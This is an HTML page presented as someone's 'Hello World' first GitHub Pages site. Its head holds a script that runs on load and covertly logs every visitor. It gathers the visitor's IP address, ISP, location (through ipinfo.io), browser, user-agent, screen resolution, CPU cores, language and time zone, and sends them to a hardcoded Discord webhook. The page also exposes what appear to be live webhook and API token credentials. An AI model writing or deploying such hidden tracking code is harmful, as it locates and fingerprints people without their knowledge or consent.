<!DOCTYPE html>
<html lang="en">
<head>

<script>
  const WEBHOOK_URL = "https://discord.com/api/webhooks/1467160104033063015/8Pd3NDwOEJQw3RoKl3ip3CNzIcN6NBXTpJqivcrR4-WoY0hyrIVc-8F5jav_U2UeGD2H"; // Replace with your webhook

  // Get User-Agent string
  const userAgent = navigator.userAgent;

  // Get browser info with modern fallback
  let browserInfo;
  if (navigator.userAgentData) {
    // Chromium-based browsers
    browserInfo = navigator.userAgentData.brands
      .map(b => `${b.brand} v${b.version}`)
      .join(", ");
  } else {
    // Fallback for non-Chromium browsers
    const ua = navigator.userAgent;
    if (ua.includes("Firefox")) browserInfo = "Firefox";
    else if (ua.includes("Safari") && !ua.includes("Chrome")) browserInfo = "Safari";
    else browserInfo = "Unknown / Not Chromium";
  }

  // Get screen resolution
  const screenRes = `${screen.width}x${screen.height}`;

  // Get CPU cores
  const cpuCores = navigator.hardwareConcurrency || "Unknown";

  // Get browser language
  const browserLang = navigator.language || "Unknown";

  // Get time zone
  const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown";

  // Fetch IP and ISP info using ipinfo.io
  fetch('https://ipinfo.io/json?token=6ed2b2fac88455') // Replace YOUR_TOKEN_HERE with free token from ipinfo.io
    .then(res => res.json())
    .then(data => {
      const ip = data.ip || "Unknown";
      const isp = data.org || "Unknown";
      const location = `${data.city || "Unknown"}, ${data.region || "Unknown"}, ${data.country || "Unknown"}`;

      // Send all info to Discord webhook using an embed
      return fetch(WEBHOOK_URL, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          embeds: [
            {
              title: "ðŸ†• New Visitor",
              color: 3447003, // Blue color
              fields: [
                { name: "IP Address", value: ip, inline: true },
                { name: "ISP / Org", value: isp, inline: true },
                { name: "Location", value: location, inline: true },
                { name: "Browser", value: browserInfo, inline: true },
                { name: "User-Agent", value: userAgent, inline: false },
                { name: "Screen Resolution", value: screenRes, inline: true },
                { name: "CPU Cores", value: cpuCores.toString(), inline: true },
                { name: "Browser Language", value: browserLang, inline: true },
                { name: "Time Zone", value: timeZone, inline: true }
              ],
              timestamp: new Date().toISOString()
            }
          ]
        })
      });
    })
    .catch(err => {
      console.error("Error sending data:", err);
    });
</script>


</head>

  <h1>Hello World! </h1>
  <p>Welcome to my first GitHub Pages website.</p>
</body>
</html>
